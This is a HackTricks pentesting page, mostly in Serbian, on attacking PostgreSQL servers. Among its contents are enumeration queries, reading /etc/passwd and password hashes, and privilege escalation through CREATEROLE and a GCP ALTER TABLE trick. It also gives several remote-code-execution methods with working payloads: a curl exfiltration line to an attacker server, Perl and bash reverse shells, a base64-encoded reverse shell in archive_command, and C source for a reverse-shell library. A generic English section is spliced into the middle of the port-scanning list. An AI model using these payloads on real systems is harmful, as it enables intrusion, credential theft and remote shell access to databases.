# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Osnovne informacije**

**PostgreSQL** je opisan kao **objektno-relacioni sistem baza podataka** koji je **open source**. Ovaj sistem ne samo da koristi SQL jezik veƒá ga i unapreƒëuje dodatnim funkcijama. Njegove moguƒánosti mu omoguƒáavaju da obradi ≈°irok spektar tipova podataka i operacija, ƒçineƒái ga svestranim izborom za programere i organizacije.

**Podrazumevani port:** 5432, a ako je ovaj port veƒá u upotrebi, ƒçini se da ƒáe postgresql koristiti sledeƒái port (verovatno 5433) koji nije u upotrebi.

```
PORT     STATE SERVICE
5432/tcp open  pgsql
```

## Pove≈æi se i Osnovno Enumerisanje

```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```

{% hint style="warning" %}
Ako prilikom pokretanja **`\list`** komande pronaƒëete bazu podataka pod nazivom **`rdsadmin`**, znate da se nalazite unutar **AWS postgresql baze podataka**.
{% endhint %}

Za vi≈°e informacija o **zloupotrebi PostgreSQL baze podataka** pogledajte:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Automatsko Nabrojavanje

```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```

### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Skeniranje portova**

Prema [**ovom istra≈æivanju**](https://www.exploit-db.com/papers/13084), kada poku≈°aj povezivanja ne uspe, `dblink` baca izuzetak `sqlclient_unable_to_establish_sqlconnection` ukljuƒçujuƒái obja≈°njenje gre≈°ke. Primeri ovih detalja navedeni su ispod.

```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```

* Host je nedostupan

`DETALJNO: nije moguƒáe povezivanje na server: Nema rute do hosta. Da li server radi na hostu "1.2.3.4" i prihvata TCP/IP konekcije na portu 5678?`

* Port je zatvoren

```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```

* Port je otvoren

```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```

## Pentesting PostgreSQL

### PostgreSQL Enumeration

During the enumeration phase, you can use tools like `nmap` to discover PostgreSQL services running on the target system. You can also use tools like `pgcli` or `psql` to connect to the PostgreSQL database and gather information about users, databases, and privileges.

### PostgreSQL Exploitation

Once you have gathered enough information during the enumeration phase, you can proceed with exploiting vulnerabilities in the PostgreSQL service. Common exploitation techniques include SQL injection, privilege escalation, and brute force attacks against weak credentials.

### PostgreSQL Post-Exploitation

After successfully exploiting a PostgreSQL service, you can perform post-exploitation activities such as dumping the database, creating backdoors, or escalating your privileges within the system. It is crucial to maintain access to the system without being detected.

### PostgreSQL Security Recommendations

To secure a PostgreSQL database, you should regularly update the software to patch known vulnerabilities. Additionally, you should follow security best practices such as using strong passwords, limiting access to the database, and monitoring for any suspicious activities.

```
DETAIL:  FATAL:  password authentication failed for user "name"
```

* Port je otvoren ili filtriran

```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```

U PL/pgSQL funkcijama trenutno nije moguƒáe dobiti detalje izuzetaka. Meƒëutim, ako imate direktni pristup PostgreSQL serveru, mo≈æete dobiti potrebne informacije. Ako izvlaƒçenje korisniƒçkih imena i lozinki iz sistema tabela nije izvodljivo, mo≈æete razmotriti kori≈°ƒáenje metode napada reƒçnikom o kojoj je diskutovano u prethodnom odeljku, jer bi mogla potencijalno dati pozitivne rezultate.

## Enumeracija privilegija

### Uloge

| Vrste uloga    |                                                                                                                                                                       |
| -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Uloga ima privilegije superkorisnika                                                                                                                                  |
| rolinherit     | Uloga automatski nasleƒëuje privilegije uloga kojima pripada                                                                                                           |
| rolcreaterole  | Uloga mo≈æe kreirati druge uloge                                                                                                                                       |
| rolcreatedb    | Uloga mo≈æe kreirati baze podataka                                                                                                                                     |
| rolcanlogin    | Uloga mo≈æe se prijaviti. Drugim reƒçima, ova uloga mo≈æe biti dodeljena kao poƒçetni identifikator sesije                                                                |
| rolreplication | Uloga je uloga za replikaciju. Uloga za replikaciju mo≈æe pokrenuti replikacione veze i kreirati i obrisati slotove za replikaciju.                                    |
| rolconnlimit   | Za uloge koje se mogu prijaviti, postavlja maksimalan broj istovremenih veza koje ova uloga mo≈æe napraviti. -1 znaƒçi da nema ograniƒçenja.                             |
| rolpassword    | Ne lozinka (uvek se ƒçita kao `********`)                                                                                                                              |
| rolvaliduntil  | Vreme isteka lozinke (koristi se samo za autentifikaciju lozinkom); null ako nema isteka                                                                              |
| rolbypassrls   | Uloga zaobilazi svaku politiku bezbednosti na nivou reda, pogledajte [Odeljak 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) za vi≈°e informacija. |
| rolconfig      | Podrazumevane vrednosti za konfiguracione promenljive za izvr≈°avanje u vreme izvr≈°avanja                                                                              |
| oid            | ID uloge                                                                                                                                                              |

#### Interesantne grupe

* Ako ste ƒçlan **`pg_execute_server_program`** mo≈æete **izvr≈°avati** programe
* Ako ste ƒçlan **`pg_read_server_files`** mo≈æete **ƒçitati** fajlove
* Ako ste ƒçlan **`pg_write_server_files`** mo≈æete **pisati** fajlove

{% hint style="info" %}
Imajte na umu da je u Postgresu **korisnik**, **grupa** i **uloga** **isti**. To zavisi samo od toga **kako ga koristite** i da li mu **dozvoljavate prijavu**.
{% endhint %}

```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```

### Tabele

```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```

### Funkcije

```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```

## Radnje na fajl-sistemu

### ƒåitanje direktorijuma i fajlova

Od ovog [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) ƒçlanovi definisane grupe **`DEFAULT_ROLE_READ_SERVER_FILES`** (pozvane **`pg_read_server_files`**) i **super korisnici** mogu koristiti **`COPY`** metod na bilo kom putanji (proverite `convert_and_check_filename` u `genfile.c`):

```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```

{% hint style="warning" %}
Zapamtite da ako niste super korisnik, ali imate dozvole **CREATEROLE**, mo≈æete **postati ƒçlan te grupe:**

```sql
GRANT pg_read_server_files TO username;
```

[**Vi≈°e informacija.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Postoje **druge postgres funkcije** koje se mogu koristiti za **ƒçitanje datoteka ili listanje direktorijuma**. Mogu ih koristiti samo **superkorisnici** i **korisnici sa eksplicitnim dozvolama**:

```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```

Mo≈æete pronaƒái **vi≈°e funkcija** na [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Jednostavno pisanje datoteka

Samo **super korisnici** i ƒçlanovi **`pg_write_server_files`** mogu koristiti kopiranje za pisanje datoteka.

```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```

{% hint style="warning" %}
Zapamtite da ako niste super korisnik, ali imate dozvole **`CREATEROLE`**, mo≈æete **postati ƒçlan te grupe:**

```sql
GRANT pg_write_server_files TO username;
```

[**Vi≈°e informacija.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Zapamtite da **COPY ne mo≈æe rukovati znakovima nove linije**, stoga ƒçak i ako koristite base64 payload, **morate poslati jednolinijski**.\
Veoma va≈æno ograniƒçenje ove tehnike je da **`copy` ne mo≈æe se koristiti za pisanje binarnih fajlova jer modifikuje neke binarne vrednosti.**

### **Uploadovanje binarnih fajlova**

Meƒëutim, postoje **druge tehnike za uploadovanje velikih binarnih fajlova:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Savet za bug bounty**: **registrujte se** na **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! Pridru≈æite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i poƒçnite da zaraƒëujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### A≈æuriranje podataka tabele PostgreSQL-a putem lokalnog pisanja fajlova

Ako imate neophodne dozvole za ƒçitanje i pisanje fajlova servera PostgreSQL-a, mo≈æete a≈æurirati bilo koju tabelu na serveru tako ≈°to ƒáete **prepisati povezani fajl ƒçvora** u [direktorijumu podataka PostgreSQL-a](https://www.postgresql.org/docs/8.1/storage.html). Vi≈°e o ovoj tehnici [**ovde**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Potrebni koraci:

1. Dobijanje direktorijuma podataka PostgreSQL-a

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Napomena:** Ako niste u moguƒánosti da dobijete trenutnu putanju direktorijuma podataka iz pode≈°avanja, mo≈æete upitati glavnu verziju PostgreSQL-a putem upita `SELECT version()` i poku≈°ati da grubo otkrijete putanju. ƒåeste putanje direktorijuma podataka na Unix instalacijama PostgreSQL-a su `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. ƒåesto kori≈°ƒáeno ime klastera je `main`. 2. Dobijanje relativne putanje do fajl ƒçvora, povezanog sa ciljnom tabelom

```sql
SELECT pg_relation_filepath('{IME_TABELE}')
```

Ovaj upit treba da vrati ne≈°to poput `base/3/1337`. Puna putanja na disku biƒáe `$DATA_DIRECTORY/base/3/1337`, tj. `/var/lib/postgresql/13/main/base/3/1337`. 3. Preuzimanje fajl ƒçvora kroz funkcije `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4. Dobijanje tipa podataka, povezanog sa ciljnom tabelom

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{IME_TABELE}';
```

5. Koristite [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) da [uredite fajl ƒçvora](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); postavite sve `rol*` boolean vrednosti na 1 za pune dozvole.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_IZ_KORAKA_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_PODACI}
```

![Demonstracija PostgreSQL Filenode Editora](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo\_datatype.gif) 6. Ponovo otpremite ureƒëeni fajl ƒçvora putem funkcija `lo_*`, i prepisujte originalni fajl na disku

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7. _(Opciono)_ Oƒçistite ke≈°iranu tabelu iz memorije pokretanjem skupog SQL upita

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8. Sada biste trebali videti a≈æurirane vrednosti tabele u PostgreSQL-u.

Takoƒëe mo≈æete postati superadmin ureƒëivanjem tabele `pg_authid`. **Pogledajte** [**sledeƒáu sekciju**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE do programa**

Od [verzije 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), samo **super korisnici** i ƒçlanovi grupe **`pg_execute_server_program`** mogu koristiti copy za RCE (primer sa eksfiltracijom:

```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```

Primer za izvr≈°enje:

```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

{% hint style="warning" %}
Zapamtite da ako niste super korisnik, ali imate dozvole **`CREATEROLE`**, mo≈æete **postati ƒçlan te grupe:**

```sql
GRANT pg_execute_server_program TO username;
```

[**Vi≈°e informacija.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Ili koristite modul `multi/postgres/postgres_copy_from_program_cmd_exec` iz **metasploita**.\
Vi≈°e informacija o ovoj ranjivosti [**ovde**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Dok je prijavljeno kao CVE-2019-9193, Postgres je proglasio da je ovo [funkcionalnost i neƒáe biti popravljeno](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE sa PostgreSQL jezicima

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE sa PostgreSQL ekstenzijama

Kada ste **nauƒçili** iz prethodnog posta **kako da otpremite binarne datoteke**, mo≈æete poku≈°ati da dobijete **RCE otpremajuƒái postgresql ekstenziju i uƒçitavajuƒái je**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE sa konfiguracionom datotekom PostgreSQL-a

{% hint style="info" %}
Sledeƒái RCE vektori su posebno korisni u ograniƒçenim SQLi kontekstima, jer se svi koraci mogu izvr≈°iti kroz ugnije≈æƒëene SELECT naredbe
{% endhint %}

**Konfiguraciona datoteka** PostgreSQL-a je **upisiva** od strane **postgres korisnika**, koji pokreƒáe bazu podataka, tako da kao **superkorisnik**, mo≈æete pisati datoteke u fajl sistem, i stoga mo≈æete **prepisati ovu datoteku.**

![](<../.gitbook/assets/image (303).png>)

#### **RCE sa ssl\_passphrase\_command**

Vi≈°e informacija [o ovoj tehnici ovde](https://pulsesecurity.co.nz/articles/postgres-sqli).

Konfiguraciona datoteka ima neke zanimljive atribute koji mogu dovesti do RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Putanja do privatnog kljuƒça baze podataka
* `ssl_passphrase_command = ''` Ako je privatna datoteka za≈°tiƒáena lozinkom (≈°ifrovana) postgresql ƒáe **izvr≈°iti komandu naznaƒçenu u ovom atributu**.
* `ssl_passphrase_command_supports_reload = off` **Ako** je ovaj atribut **ukljuƒçen** komanda izvr≈°ena ako je kljuƒç za≈°tiƒáen lozinkom **ƒáe se izvr≈°iti** kada se izvr≈°i `pg_reload_conf()`.

Zatim, napadaƒç ƒáe morati:

1. **Izvuƒái privatni kljuƒç** sa servera
2. **≈†ifrovati** preuzeti privatni kljuƒç:
3. `rsa -aes256 -in preuzeti-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
4. **Prepisati**
5. **Izvuƒái** trenutnu postgresql **konfiguraciju**
6. **Prepisati** **konfiguraciju** sa pomenutim atributima konfiguracije:
7. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
8. `ssl_passphrase_command_supports_reload = on`
9. Izvr≈°iti `pg_reload_conf()`

Prilikom testiranja primetio sam da ƒáe ovo raditi samo ako **datoteka privatnog kljuƒça ima privilegije 640**, da je **vlasnik root** i da je **grupa ssl-cert ili postgres** (tako da postgres korisnik mo≈æe da je ƒçita), i da je sme≈°tena u _/var/lib/postgresql/12/main_.

#### **RCE sa archive\_command**

**Vi≈°e** [**informacija o ovoj konfiguraciji i o WAL ovde**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Jo≈° jedan atribut u konfiguracionoj datoteci koji je iskoristiv je `archive_command`.

Da bi ovo radilo, postavka `archive_mode` mora biti `'on'` ili `'always'`. Ako je to taƒçno, tada bismo mogli prebrisati komandu u `archive_command` i naterati je da se izvr≈°i putem WAL (write-ahead logging) operacija.

Op≈°ti koraci su:

1. Proveriti da li je re≈æim arhiviranja omoguƒáen: `SELECT current_setting('archive_mode')`
2. Prebrisati `archive_command` sa payload-om. Na primer, reverzna ljuska: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Ponovo uƒçitati konfiguraciju: `SELECT pg_reload_conf()`
4. Naterati operaciju WAL da se izvr≈°i, ≈°to ƒáe pozvati arhivsku komandu: `SELECT pg_switch_wal()` ili `SELECT pg_switch_xlog()` za neke verzije Postgresa

#### **RCE sa bibliotekama za uƒçitavanje pri pokretanju**

Vi≈°e informacija [o ovoj tehnici ovde](https://adeadfed.com/posts/postgresql-select-only-rce/).

Ovaj vektor napada koristi sledeƒáe konfiguracione promenljive:

* `session_preload_libraries` -- biblioteke koje ƒáe biti uƒçitane od strane PostgreSQL servera prilikom povezivanja klijenta.
* `dynamic_library_path` -- lista direktorijuma gde ƒáe PostgreSQL server tra≈æiti biblioteke.

Mo≈æemo postaviti vrednost `dynamic_library_path` na direktorijum koji je upisiv od strane `postgres` korisnika koji pokreƒáe bazu podataka, na primer, `/tmp/` direktorijum, i otpremiti zlonamerni `.so` objekat tamo. Zatim ƒáemo naterati PostgreSQL server da uƒçita na≈°u novu otpremljenu biblioteku ukljuƒçivanjem je u promenljivu `session_preload_libraries`.

Koraci napada su:

1. Preuzmite originalni `postgresql.conf`
2. Ukljuƒçite `/tmp/` direktorijum u vrednost `dynamic_library_path`, na primer `dynamic_library_path = '/tmp:$libdir'`
3. Ukljuƒçite ime zlonamerne biblioteke u vrednost `session_preload_libraries`, na primer `session_preload_libraries = 'payload.so'`
4. Proverite glavnu verziju Postgresa putem upita `SELECT version()`
5. Kompajlirajte zlonamerni kod biblioteke sa odgovarajuƒáim PostgreSQL dev paketom Primer koda:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
kod preuzet sa https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Kompajliranje koda:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Otpremite zlonamerni `postgresql.conf`, kreiran u koracima 2-3, i prepi≈°ite originalni
7. Otpremite `payload.so` iz koraka 5 u `/tmp` direktorijum
8. Ponovo uƒçitajte konfiguraciju servera ponovnim pokretanjem servera ili pozivanjem upita `SELECT pg_reload_conf()`
9. Prilikom sledeƒáe DB konekcije, dobiƒáete vezu za reverznu ljusku.

## **Postgres Privesc**

### **Postgres Privesc**

#### **Grant**

Prema [**dokumentaciji**](https://www.postgresql.org/docs/13/sql-grant.html): _Uloge koje imaju privilegiju **`CREATEROLE`** mogu **dodeljivati ili oduzimati ƒçlanstvo u bilo kojoj ulozi** koja **nije**_ _**superkorisnik**._

Dakle, ako imate dozvolu **`CREATEROLE`** mo≈æete sebi dodeliti pristup drugim **ulogama** (koje nisu superkorisnici) ≈°to vam mo≈æe omoguƒáiti ƒçitanje i pisanje datoteka i izvr≈°avanje komandi:

```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```

#### Izmena lozinke

Korisnici sa ovom ulogom takoƒëe mogu **promeniti** **lozinke** drugih **korisnika koji nisu superkorisnici**:

```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```

#### Privesc to SUPERUSER

ƒåesto je uobiƒçajeno da **lokalni korisnici mogu da se prijave u PostgreSQL bez uno≈°enja bilo kakve lozinke**. Stoga, kada ste prikupili **dozvole za izvr≈°avanje koda**, mo≈æete zloupotrebiti ove dozvole da biste dobili ulogu **`SUPERUSER`**:

```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```

Ovo je obiƒçno moguƒáe zbog sledeƒáih linija u datoteci **`pg_hba.conf`**:

```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```

### **ALTER TABLE privesc**

U [**ovom obja≈°njenju**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) je obja≈°njeno kako je bilo moguƒáe izvr≈°iti **privesc** u Postgres GCP zloupotrebom privilegije ALTER TABLE koja je dodeljena korisniku.

Kada poku≈°ate **dodeliti vlasni≈°tvo nad tabelom drugom korisniku**, trebalo bi da dobijete **gre≈°ku** koja to spreƒçava, ali oƒçigledno je GCP dao tu **opciju korisniku postgres koji nije superkorisnik** u GCP-u:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Povezujuƒái ovu ideju sa ƒçinjenicom da kada se izvr≈°e komande **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) na **tabeli sa funkcijom indeksa**, **funkcija** se **poziva** kao deo komande sa **dozvolama vlasnika tabele**. Moguƒáe je kreirati indeks sa funkcijom, dodeliti vlasniƒçke dozvole **superkorisniku** nad tom tabelom, a zatim pokrenuti ANALYZE nad tabelom sa zlonamernom funkcijom koja ƒáe moƒái da izvr≈°ava komande jer koristi privilegije vlasnika.

```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```

#### Eksploatacija

1. Poƒçnite kreiranjem nove tabele.
2. Ubacite neki nebitan sadr≈æaj u tabelu kako biste obezbedili podatke za funkciju indeksiranja.
3. Razvijte zlonamernu funkciju indeksiranja koja sadr≈æi payload za izvr≈°avanje koda, omoguƒáavajuƒái izvr≈°avanje neovla≈°ƒáenih komandi.
4. Izmijenite vlasnika tabele u "cloudsqladmin", ≈°to je uloga superkorisnika GCP-a ekskluzivno kori≈°ƒáena od strane Cloud SQL-a za upravljanje i odr≈æavanje baze podataka.
5. Izvr≈°ite ANALYZE operaciju na tabeli. Ova akcija nateruje PostgreSQL engine da preƒëe u korisniƒçki kontekst vlasnika tabele, "cloudsqladmin". Kao rezultat, zlonamerna funkcija indeksiranja se poziva sa dozvolama "cloudsqladmin", omoguƒáavajuƒái izvr≈°avanje prethodno neovla≈°ƒáene shell komande.

U PostgreSQL-u, ovaj tok izgleda ne≈°to ovako:

```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```

